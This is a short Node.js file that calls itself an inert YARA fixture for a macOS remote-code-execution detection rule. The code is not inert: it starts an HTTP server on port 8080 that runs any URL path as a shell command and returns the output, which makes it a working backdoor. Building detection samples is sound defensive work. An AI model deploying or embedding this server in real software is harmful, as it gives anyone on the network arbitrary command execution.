// Inert YARA fixture for CERBER_MacOS_Node_HTTP_RCE
const http = require('http');
const { exec } = require('child_process');
http.createServer((req, res) => {
    exec(decodeURIComponent(req.url.slice(1)), (err, stdout) => res.end(stdout));
}).listen(8080);
